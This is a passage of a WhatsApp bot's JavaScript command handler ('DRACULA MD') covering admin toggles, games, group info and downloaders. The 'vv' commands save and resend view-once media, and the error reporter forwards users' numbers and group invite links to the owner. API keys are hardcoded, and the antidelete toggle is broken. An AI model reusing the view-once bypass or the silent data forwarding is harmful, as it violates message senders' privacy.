        reply('✅ 𝐀𝐧𝐭𝐢𝐜𝐚𝐥𝐥 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐝𝐢𝐬𝐚𝐛𝐥𝐞𝐝.');
    } else {
        reply('❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐩𝐭𝐢𝐨𝐧. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐮𝐬𝐞 "𝐨𝐧" 𝐨𝐫 "𝐨𝐟𝐟".'); // Handles invalid arguments
    }
    break;
}

case 'love': {
        await moving();
        break;
    }
  
  case "runtime": {
  await loading();
    if (!isOwner) return reply('🚫 𝙾𝙽𝙻𝚈 𝙰𝙳𝙼𝙸𝙽𝚂 𝙲𝙰𝙽 𝚄𝚂𝙴 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳');

    // Calculate runtime in seconds
    const uptimeSeconds = Math.floor(process.uptime());

    // Convert to human-readable time (days, hours, minutes, seconds)
    const days = Math.floor(uptimeSeconds / (24 * 60 * 60));
    const hours = Math.floor((uptimeSeconds % (24 * 60 * 60)) / (60 * 60));
    const minutes = Math.floor((uptimeSeconds % (60 * 60)) / 60);
    const seconds = uptimeSeconds % 60;

    // Create a fancy, styled reply
    const fancyReply = `
🌟 *𝚂𝚈𝚂𝚃𝙴𝙼 𝚁𝚄𝙽𝚃𝙸𝙼𝙴* 🌟
━━━━━━━━━━━━━━━━━━━━━
⏱️ *𝚄𝙿𝚃𝙸𝙼𝙴:*
*${days}* 𝙳𝚊𝚢𝚜
*${hours}* 𝙷𝚘𝚞𝚛𝚜
*${minutes}* 𝙼𝚒𝚗𝚞𝚝𝚎𝚜
*${seconds}* 𝚂𝚎𝚌𝚘𝚗𝚍𝚜
━━━━━━━━━━━━━━━━━━━━━
🖥️ 𝙺𝙴𝙴𝙿 𝙸𝚃 𝚁𝚄𝙽𝙽𝙸𝙽𝙶 🚀

> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰  𝙼𝙳
    `;

    return reply(fancyReply.trim());
}
break;
  
 case 'speed': {
    let fancyMessage = `*🚀 Speed Test Results 🚀*\n\n` +
                       `╭───────────────╮\n` +
                       `│  *⚡ Speed:* ${latensi.toFixed(4)} seconds  │\n` +
                       `╰───────────────╯\n` +
                       `\n> 𝙳𝚁𝙰𝙲𝚄𝙻𝙰  𝙼𝙳`;

    setReply(fancyMessage);
}
break;


case 'owner':
case 'creator': {
await loading();
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender;
    let pp = await conn.profilePictureUrl(who).catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60');
    let name = await conn.getName(who);

    await conn.sendContactArray(m.chat, [
        [`${nomerOwner}@s.whatsapp.net`, `${ownerName}`, `Bot Developer`, `✍️ Still Improving!`],
        [`${conn.user.jid.split('@')[0]}`, `${await conn.getName(conn.user.jid)}`, `🤖 I'm a WhatsApp Bot`, `⚠️ Please don't spam, block, or ban`]
    ], m);
    await sendAnti(`Hi 👋, want to chat with me? Please get straight to the point!`);
}
break;





case 'antivirtex': {
await loading();
    if (!isGroup) return reply("❌ *Ｔｈｉｓ ｃｏｍｍａｎｄ ｃａｎ ｏｎｌｙ ｂｅ ｕｓｅｄ ｉｎ ｇｒｏｕｐｓ!*");
    if (!isGroupAdmins && !isOwner) return reply("🚫 *Ｏｎｌｙ ａｄｍｉｎｓ ｏｒ ｔｈｅ ｏｗｎｅｒ ｃａｎ ｕｓｅ ｔｈｉｓ ｃｏｍｍａｎｄ!*");
    if (!isBotGroupAdmins) return reply("⚠️ *Ｉ ｎｅｅｄ ｔｏ ｂｅ ａ ｇｒｏｕｐ ａｄｍｉｎ ｔｏ ｅｘｅｃｕｔｅ ｔｈｉｓ ｃｏｍｍａｎｄ!*");

    if (args[0] === 'on' || args[0] === 'enable' || args[0] === '1') {
        if (isAntiVirtex) return reply("✅ *Ａｎｔｉ-Ｖｉｒｔｅｘ ｉｓ ａｌｒｅａｄｙ ｅｎａｂｌｅｄ!*");
        db.data.chats[from].antivirtex = true;
        reply("✨ *Ａｎｔｉ-Ｖｉｒｔｅｘ ｈａｓ ｂｅｅｎ ｓｕｃｃｅｓｓｆｕｌｌｙ ｅｎａｂｌｅｄ!*");
    } else if (args[0] === 'off' || args[0] === 'disable' || args[0] === '0') {
        if (!isAntiVirtex) return reply("❌ *Ａｎｔｉ-Ｖｉｒｔｅｘ ｉｓ ａｌｒｅａｄｙ ｄｉｓａｂｌｅｄ!*");
        db.data.chats[from].antivirtex = false;
        reply("✨ *Ａｎｔｉ-Ｖｉｒｔｅｘ ｈａｓ ｂｅｅｎ ｓｕｃｃｅｓｓｆｕｌｌｙ ｄｉｓａｂｌｅｄ!*");
    } else if (!q) {
        reply(`*🔒 ＡＮＴＩ-ＶＩＲＴＥＸ ＭＯＤＥ 🔒*\nＵｓａｇｅ： \`${prefix + command} ｏｎ／ｏｆｆ\``);
    }
}
break;


case 'gcinfo': {
    if (!isGroup) return reply("❌ *This command can only be used in groups!*");

    let _meta = await conn.groupMetadata(from);
    console.log(_meta);

    let _img = await conn.profilePictureUrl(_meta.id, 'image');

    let caption = `*📌 ɢʀᴏᴜᴘ ɪɴғᴏ 📌*

*🛡️ ꜱʏꜱᴛᴇᴍ ꜱᴇᴛᴛɪɴɢꜱ:*
🔗 ᴀɴᴛɪ ʟɪɴᴋ (ɢʀᴏᴜᴘ): *${isAntilinkGc ? 'ᴀᴄᴛɪᴠᴇ ✅' : 'ᴅɪꜱᴀʙʟᴇᴅ ❌'}*
🌐 ᴀɴᴛɪ ʟɪɴᴋ: *${isAntiLink ? 'ᴀᴄᴛɪᴠᴇ ✅' : 'ᴅɪꜱᴀʙʟᴇᴅ ❌'}*
🔒 ᴀɴᴛɪ ᴠɪʀᴛᴇx: *${isAntiVirtex ? 'ᴀᴄᴛɪᴠᴇ ✅' : 'ᴅɪꜱᴀʙʟᴇᴅ ❌'}*
🚷 ᴀɴᴛɪ ꜰᴏʀᴇɪɢɴ ɴᴜᴍʙᴇʀꜱ: *${isKickarea ? 'ᴀᴄᴛɪᴠᴇ ✅' : 'ᴅɪꜱᴀʙʟᴇᴅ ❌'}*
🗑️ ᴀɴᴛɪ ᴅᴇʟᴇᴛᴇ: *${isAntidelete ? 'ᴀᴄᴛɪᴠᴇ ✅' : 'ᴅɪꜱᴀʙʟᴇᴅ ❌'}*
👀 ᴀɴᴛɪ ᴠɪᴇᴡᴏɴᴄᴇ: *${isAntiViewOnce ? 'ᴀᴄᴛɪᴠᴇ ✅' : 'ᴅɪꜱᴀʙʟᴇᴅ ❌'}*
💬 ᴀɴᴛɪ ᴛᴏxɪᴄ: *${isAntiToxic ? 'ᴀᴄᴛɪᴠᴇ ✅' : 'ᴅɪꜱᴀʙʟᴇᴅ ❌'}*
📢 ᴀɴᴛɪ ᴘʀᴏᴍᴏᴛɪᴏɴꜱ: *${isAntiPromosi ? 'ᴀᴄᴛɪᴠᴇ ✅' : 'ᴅɪꜱᴀʙʟᴇᴅ ❌'}*
🤖 ꜱɪᴍɪ ɢʀᴏᴜᴘ: *${isSimi ? 'ᴀᴄᴛɪᴠᴇ ✅' : 'ᴅɪꜱᴀʙʟᴇᴅ ❌'}*

*📝 ɢʀᴏᴜᴘ ᴅᴇᴛᴀɪʟꜱ:*
⭓ *ɴᴀᴍᴇ:* ${_meta.subject}
⭓ *ɢʀᴏᴜᴘ ɪᴅ:* ${_meta.id}
⭓ *ᴄʀᴇᴀᴛᴇᴅ ᴏɴ:* ${moment(_meta.creation * 1000).format('LL')}
⭓ *ɢʀᴏᴜᴘ ᴏᴡɴᴇʀ:* ${_meta.subjectOwner}
⭓ *ᴀᴅᴍɪɴꜱ:* ${_meta.participants.filter(x => x.admin === 'admin').length}
⭓ *ᴍᴇᴍʙᴇʀꜱ:* ${_meta.participants.filter(x => x.admin === null).length}
⭓ *ᴅᴇꜱᴄʀɪᴘᴛɪᴏɴ:*
${_meta.desc}`;

    await conn.sendMessage(
        from,
        {
            caption,
            image: await getBuffer(_img),
        },
        { quoted: fcall }
    );
}
break;



case 'vv': {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    
    if (!m.quoted) 
        return reply(`❗ *𝚁𝚎𝚙𝚕𝚢 𝚝𝚘 𝚊 𝚟𝚒𝚎𝚠-𝚘𝚗𝚌𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎!*`);
    if (m.quoted.mtype !== 'viewOnceMessageV2') 
        return reply(`❗ *𝚃𝚑𝚒𝚜 𝚒𝚜 𝚗𝚘𝚝 𝚊 𝚟𝚒𝚎𝚠-𝚘𝚗𝚌𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎.*`);
    
    let msg = m.quoted.message;
    let type = Object.keys(msg)[0];
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video');
    let buffer = Buffer.from([]);
    
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk]);
    }

    let caption = msg[type].caption || '';
    caption += `\n\n> 𝙳𝙾𝙽𝙴 𝙱𝚈 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳`;

    if (/video/.test(type)) {
        return conn.sendFile(m.chat, buffer, 'media.mp4', caption, m);
    } else if (/image/.test(type)) {
        return conn.sendFile(m.chat, buffer, 'media.jpg', caption, m);
    }
}
break;


case '🐦':
case 'vv2': {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    
    
    if (!m.quoted) 
        return reply(`❗ *𝚁𝚎𝚙𝚕𝚢 𝚝𝚘 𝚊 𝚟𝚒𝚎𝚠-𝚘𝚗𝚌𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎!*`);
    if (m.quoted.mtype !== 'viewOnceMessageV2') 
        return reply(`❗ *𝚃𝚑𝚒𝚜 𝚒𝚜 𝚗𝚘𝚝 𝚊 𝚟𝚒𝚎𝚠-𝚘𝚗𝚌𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎.*`);
    
    let msg = m.quoted.message;
    let type = Object.keys(msg)[0];
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video');
    let buffer = Buffer.from([]);
    
    // Concatenate the chunks into a buffer
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk]);
    }

    // Caption to be added to the media
    let caption = msg[type].caption || '';
    caption += `\n\n> 𝙳𝙾𝙽𝙴 𝙱𝚈 𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳`;

    // Send the media to the sender (who invoked the command)
    const senderNumber = m.sender;  // Get the sender's number

    if (/video/.test(type)) {
        return conn.sendFile(senderNumber, buffer, 'media.mp4', caption);
    } else if (/image/.test(type)) {
        return conn.sendFile(senderNumber, buffer, 'media.jpg', caption);
    }
}
break;

case 'rps': {
    await loading();
    if (!q) {
        return reply(`*🎮 Rock-Paper-Scissors Game 🎮*\n\nUsage:\nType "${prefix + command} <rock/paper/scissors>" to play the game.`);
    }
    
    // User input
    const userChoice = q.toLowerCase();
    const choices = ['rock', 'paper', 'scissors']; // Possible bot choices

    if (!choices.includes(userChoice)) {
        return reply(`❌ Invalid choice! Please select *rock*, *paper*, or *scissors*.\nExample: ${prefix + command} rock`);
    }

    // Bot random choice
    const botChoice = choices[Math.floor(Math.random() * choices.length)];

    // Determine the result
    let result;
    if (userChoice === botChoice) {
        result = `🤝 *It's a Draw!* Both chose *${botChoice}*`;
    } else if (
        (userChoice === 'rock' && botChoice === 'scissors') ||
        (userChoice === 'scissors' && botChoice === 'paper') ||
        (userChoice === 'paper' && botChoice === 'rock')
    ) {
        result = `🎉 *You Win!* You chose *${userChoice}*, Bot chose *${botChoice}*`;
    } else {
        result = `💔 *You Lose!* You chose *${userChoice}*, Bot chose *${botChoice}*`;
    }

    // Send the result in one message
    reply(`*🎮 Rock-Paper-Scissors Game 🎮*\n\n*Your Choice:* ${userChoice}\n*Bot's Choice:* ${botChoice}\n\n${result}`);
}
break;

case 'autoread': {
    await loading();

    // Ensure only admins or owners can use it
    if (!isGroupAdmins && !isOwner) return onlyAdmin();

    // Check if args[0] is provided and is a valid string
    if (args[0] && typeof args[0] === 'string') {
        // Enabling Auto-Read
        if (['on', 'enable', '1'].includes(args[0].toLowerCase())) {
            if (global.autoread) return reply("✅ *Autoread is already enabled!*"); // If already enabled
            global.autoread = true;  // Set autoread to true
            reply("✅ *Successfully enabled Autoread!* Now all messages will be automatically read.");
        } 
        // Disabling Auto-Read
        else if (['off', 'disable', '0'].includes(args[0].toLowerCase())) {
            if (!global.autoread) return reply("✅ *Autoread is already disabled!*"); // If already disabled
            global.autoread = false;  // Set autoread to false
            reply("✅ *Successfully disabled Autoread!* Messages will not be automatically read.");
        } 
    } else {
        // If no valid argument is provided, show usage information
        reply(`*🛡️ AUTOREAD MODE 🛡️*\nUse ${prefix + command} on/off or enable/disable to toggle autoread.`);
    }
    break;
}

case 'autotype': {
    await loading();

    // Ensure only admins or owners can use it
    if (!isGroupAdmins && !isOwner) return onlyAdmin();

    // Check if args[0] is provided and is a valid string
    if (args[0] && typeof args[0] === 'string') {
        // Enabling Auto-Read
        if (['on', 'enable', '1'].includes(args[0].toLowerCase())) {
            if (global.autotype) return reply("✅ *autotype is already enabled!*"); // If already enabled
            global.autotype = true;  // Set autotype to true
            reply("✅ *Successfully enabled autotype!* Now all messages will be automatically read.");
        } 
        // Disabling Auto-Read
        else if (['off', 'disable', '0'].includes(args[0].toLowerCase())) {
            if (!global.autotype) return reply("✅ *autotype is already disabled!*"); // If already disabled
            global.autotype = false;  // Set autotype to false
            reply("✅ *Successfully disabled autotype!* Messages will not be automatically read.");
        } 
    } else {
        // If no valid argument is provided, show usage information
        reply(`*🛡️ autotype MODE 🛡️*\nUse ${prefix + command} on/off or enable/disable to toggle autotype.`);
    }
    break;
}



case 'autoviewstatus': {
    await loading();

    // Ensure only admins or owners can use it
    if (!isGroupAdmins && !isOwner) return onlyAdmin();

    // Check if args[0] is provided and is a valid string
    if (args[0] && typeof args[0] === 'string') {
        // Enabling Auto-View Status
        if (['on', 'enable', '1'].includes(args[0].toLowerCase())) {
            if (global.autoviewstatus) return reply("✅ *autoviewstatus is already enabled!*"); // If already enabled
            global.autoviewstatus = true;  // Set autoviewstatus to true
            reply("✅ *Successfully enabled autoviewstatus!* Now all statuses will be automatically viewed.");
        } 
        // Disabling Auto-View Status
        else if (['off', 'disable', '0'].includes(args[0].toLowerCase())) {
            if (!global.autoviewstatus) return reply("✅ *autoviewstatus is already disabled!*"); // If already disabled
            global.autoviewstatus = false;  // Set autoviewstatus to false
            reply("✅ *Successfully disabled autoviewstatus!* Statuses will not be automatically viewed.");
        } 
    } else {
        // If no valid argument is provided, show usage information
        reply(`*🛡️ AUTOVIEWSTATUS MODE 🛡️*\nUse ${prefix + command} on/off or enable/disable to toggle autoviewstatus.`);
    }
    break;
}


case 'statusemoji': {
    await loading();



    // Check if args[0] is provided
    if (args[0]) {
        let emoji = args[0];  // Directly use the provided emoji

        // Check if it's a valid emoji (non-empty and not just a string of spaces)
        if (emoji.trim().length > 0) {
            // Check if the emoji is already set
            if (global.statusEmoji === emoji) {
                return reply(`⫸ The status reaction emoji is already set to ${emoji} ⫷`);
            }

            // Set the emoji to be used for reacting
            global.statusEmoji = emoji;
            reply(`✅ *Successfully set the status reaction emoji to:* ${global.statusEmoji}`);
        } else {
            reply("⫸ Please provide a valid emoji to react with ⫷");
        }
    } else {
        // If no emoji is provided
        reply("⫸ Please provide an emoji to react with \nExample: *${prefix + command} ❤️*");
    }
    break;
}





case 'stalk':
    if (!q) return reply(`𝕌𝕤𝕖 𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix}${command} https://whatsapp.com/channel/0029VaYauR9ISTkHTj4xvi1l`);

    async function fetchChannelData(url) {
        try {
            const apiUrl = `https://api.giftedtech.my.id/api/stalk/wachannel?apikey=gifted&url=${encodeURIComponent(url)}`;
            const response = await fetch(apiUrl);
            
            // Check if the response is OK (status code 200)
            if (!response.ok) {
                throw new Error('Failed to fetch data');
            }

            const data = await response.json();  // Parse the JSON response

            // Log the parsed response data
            console.log('Response Data:', data);

            return data; // Return the parsed response
        } catch (error) {
            console.error('Error:', error.message);
            throw new Error('Failed to fetch WhatsApp channel data');
        }
    }

    try {
        const channelData = await fetchChannelData(q);
        console.log('Parsed Response:', channelData);
        reply(`Channel details: ${JSON.stringify(channelData)}`);
    } catch (e) {
        reply(`𝔼𝕣𝕣𝕠𝕣: ${e.message}`);
    }
break;



case 'downloader':
    if (!q) return reply(`𝕌𝕤𝕖 𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix}${command} https://example.com`);

    async function downloadFile(url) {
        try {
            const apiUrl = `https://bk9.fun/download/alldownload?url=${encodeURIComponent(url)}`;
            const response = await axios.get(apiUrl);
            
            // Log response headers and parsed data
            console.log('Response Headers:', response.headers);
            console.log('Response Data:', response.data);

            return response.data; // Return the parsed response
        } catch (error) {
            console.error('Error:', error.message);
            throw new Error('Failed to fetch download link');
        }
    }

    try {
        const data = await downloadFile(q);
        console.log('Parsed Response:', data);
        reply(`Download details: ${JSON.stringify(data)}`);
    } catch (e) {
        reply(`𝔼𝕣𝕣𝕠𝕣: ${e.message}`);
    }
break;
  
  
  case 'antidelete': {
  await loading();

    
    // Enabling Anti-Delete 
    if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1') {
        if (global.antidelete === true) return reply("𝘼𝙣𝙩𝙞-𝘿𝙚𝙡𝙚𝙩𝙚 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙚𝙣𝙖𝙗𝙡𝙚𝙙!"); // If already enabled
        global.antidelete
        reply("✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙚𝙣𝙖𝙗𝙡𝙚𝙙 𝘼𝙣𝙩𝙞-𝘿𝙚𝙡𝙚𝙩𝙚!");
    } 
    // Disabling Anti-Delete
    else if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (global.antidelete === false) return reply("𝘼𝙣𝙩𝙞-𝘿𝙚𝙡𝙚𝙩𝙚 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙤𝙛𝙛!"); // If already disabled
        global.antidelete
        reply("✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙙𝙞𝙨𝙖𝙗𝙡𝙚𝙙 𝘼𝙣𝙩𝙞-𝘿𝙚𝙡𝙚𝙩𝙚!");
    } 
    // If no argument is provided, show the usage information
    else if (!q) {
        reply(`*🛡️ 𝘼𝙉𝙏𝙄-𝘿𝙀𝙇𝙀𝙏𝙀 𝙈𝙊𝘿𝙀 🛡️*\n𝙐𝙨𝙚 ${prefix + command} 𝙤𝙣/𝙤𝙛𝙛 𝙩𝙤 𝙚𝙣𝙖𝙗𝙡𝙚 𝙤𝙧 𝙙𝙞𝙨𝙖𝙗𝙡𝙚.`);
    }
}
break;
  
  
    
//================================================================================================= final case 
    

default:

    
 }
 
 //Akhir switch command
//autosticker
        if (db.data.settings['settingbot'].autoSticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
                conn.sendImageAsSticker(from, mediac, m, { packname: global.packName, author: global.authorName })
                reply(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
                conn.sendVideoAsSticker(from, mediac, m, { packname: global.packName, author: global.authorName })
            }
        }




  

  
  


 

    




                                 


//AUTO RESPON SIMI VIA REPLY/TAG BOT
  if(isSimi){
const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == "stickerMessage" && m.message.stickerMessage.contextInfo != null ? m.message.stickerMessage.contextInfo.participant || "" : ""
if (isGroup && chat.simi && Input == botNumber && isGroup && !replyCommand && !isAudio && !allcommand.includes(toFirstCase(command)) || isGroup && chat.simi && mentionByReplySticker == botNumber && isSticker && !replyCommand || body.toLowerCase().includes(botName.toLowerCase())) {
await sleep(2000)
conn.sendPresenceUpdate('recording', from)
if(isQuotedReplySticker || isReplySticker ){
await sleep(2000)
let namastc = await pickRandom(Object.keys(db.data.sticker))
conn.sendMessage(from, {sticker: {url:db.data.sticker[namastc].link}}, {quoted:fsimi })
} else{
let jawab = ["Afa iyah 🗿","Oh","Aku ga ngerti om 🐦","Boong","🗿","🐦","Oh gitu 🐦"]
let teks1 = pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`,`${teks2}`]
let random = pickRandom(hasil)
let kata = mentionByTag? body.replace(mentionByTag, "") : body
let kato = ["Kenapa ?","Ha ?","Napa tag gua ?","napa ?","ya ?","apa ?","Hmm ?"]
let acak = pickRandom(kato)
if(kata == "") return conn.sendMessage(from,{text: acak},{quoted: fsimi})
let nana = /sayang|bercanda/
try {
await sleep(1000)
let simi = await getMessage(kata, 'id')
m.reply(simi.replace(nana,"****"))
} catch (e) {
Log(e)
await sleep(1000)
//conn.sendMesage(from,{text:random},{quoted:fsimi})
reply(random)
}




// Define the moving function
async function moving() {
    // Extensive array of heart emojis
    var baralod = [
        "💝", "💙", "❤️‍🔥", "💞", "❤️", "💘", "💕", "💓", 
        "💜", "💗", "💖", "🧡", "💛", "💟", "❣️", "💔", "🩷",
        "🩵", "🩶", "🖤", "🤍", "💚", "💛", "💌", "💘",
        "💕", "💓", "💖", "💗", "❤️‍🩹", "💑", "💏", "💂‍❤️‍",
        "🎔", "💟", "💖", "🧡", "💝", "💛", "❣️", "💜"
    ];

    // Send the first message to get the key
    let { key } = await conn.sendMessage(from, { text: '💌' });

    // Delay function that returns a promise resolved after specified milliseconds
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    // Loop through the emojis and edit the message with each emoji
    for (let i = 0; i < baralod.length; i++) {
        await conn.sendMessage(from, { text: baralod[i], edit: key });
        await delay(300); // 0.3-second delay between each emoji
    }
}




async function mainSimi(aw){
let res = await fetchJson (`https://api.miftahganzz.my.id/api/ai/simisimi?q=${aw}&apikey=officialdittaz`)
let data = res.respon
let pesan = data.replace('simi', Botname).replace('Simi', Botname)
return pesan
}

async function getMessage(yourMessage, langCode) {
const res = await axios.post(
'https://api.simsimi.vn/v2/simtalk',
new URLSearchParams({
'text': yourMessage,
'lc': langCode
})
)

if (res.status > 200)
throw new Error(res.data.success);
return res.data.message.replace('simi', botName)
}


}
}
  }
} catch (err){
console.log(err)
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
if(err.message.includes("Cannot find module")){
let module = err.message.split("Cannot find module '")[1].split("'")[0]
let teks = `The module ${module} has not been installed yet.
Please install it first.`
return await conn.sendText(dev.key.remoteJid, teks, dev)
}
await conn.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${botName}`, dev) 
if(checkError(err.message, db.data.listerror)) return
addError(err.message, command, db.data.listerror)
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("The command has been blocked due to an error.")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){ 
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await conn.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Bot Is Not Admin`
} else if(!isGroup){
var yeh = `Bot Is Not In The Group`
} 

let teks =`\n*]───── 「 Bug ⚠️」 ─────[*\n\n👤 Name : ${pushname}\n📳 Number : wa.me/${senderNumber}\n📢 Bug info :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'private chat'}\n🆔 ID : ${from}\n🌐 Group link : ${yeh}\n\n\n`

conn.sendText(Ownerin, teks, dev)

if(!autoblockcmd){
//await conn.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await conn.sendMedia (Ownerin, media, dev, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



  
} catch (err){
console.log(chalk.bgRed(color("[  ERROR  ]", "black")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true 
 conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green')) 
if(Console){
conn.sendMessage(Ownerin, {text : util.format(e)})
}
//console.log(e)
}
}

       
    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.bgGreen(color("[  UPDATE ]", "black")),chalk.white(`${__filename}`) )
delete require.cache[file]
require(file)
}) 